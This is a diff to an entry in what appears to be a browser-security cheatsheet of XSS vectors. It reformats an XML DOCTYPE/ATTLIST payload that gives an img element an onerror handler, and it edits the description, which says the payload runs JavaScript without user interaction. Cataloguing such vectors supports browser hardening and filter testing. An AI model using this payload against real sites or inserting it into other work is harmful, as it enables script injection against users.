@@ -2110,9 +2110,9 @@ var items =
             'ru' : '',
             'de' : ''
         },
-        'data'       : '<!DOCTYPE x [<!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "x" onerror CDATA "%js_alert%">]><img />',
+        'data'       : '<!DOCTYPE x [\r\n\t<!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "x" onerror CDATA "%js_alert%">\r\n]><img />',
         'description': {
-            'en' : 'XML ATTLIST declarations can be used to create attributes and assign values for the following tags inside the DOCTYPE declaration. By chosing the right namespace and attribute combinations it\'s possible to create an ATTLIST declaration causing JavaScript execution without user interaction.', 
+            'en' : 'XML ATTLIST declarations can be used to create attributes and assign values for matching tags inside the DOCTYPE declaration. By chosing the right namespace and attribute combinations it\'s possible to create an ATTLIST declaration causing JavaScript execution without user interaction.', 
             'ja' : '',
             'ru' : '',
             'de' : ''
